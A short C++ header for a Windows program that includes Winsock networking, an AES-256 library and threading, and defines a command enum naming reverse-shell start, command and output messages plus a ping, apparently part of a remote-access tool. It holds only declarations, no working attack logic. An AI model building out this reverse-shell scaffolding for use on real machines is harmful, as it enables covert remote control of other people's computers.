#ifndef _HEADERS
#define _HEADERS 1

#include<ws2tcpip.h>
#include<windows.h>
#include<lmcons.h>
#include <intrin.h>
#include<iostream>
#include<mutex>
#include<atomic>
#include<thread>
#include<random>
#include<fcntl.h>
#include<fstream>
#include<sstream>
#include<string>
#include<vector>
#include<cstring>
#include<ctime>

#include "aes256/aes256.hpp"

#define AES_KEY_LEN 32


extern bool bSignalFlag;
#define error() std::cout<<"Error["<<GetLastError()<<"]\n";
#define error_2(x) std::cout<<"["<<x<<"]"<<"Error["<<GetLastError()<<"]\n";


typedef unsigned int u_int;

#define ___DEBUG_

namespace EnumComandos {
    enum Enum {
        Reverse_Shell_Start = 500,
        Reverse_Shell_Command,
        Reverse_Shell_Salida,
        PING
    };
}

#endif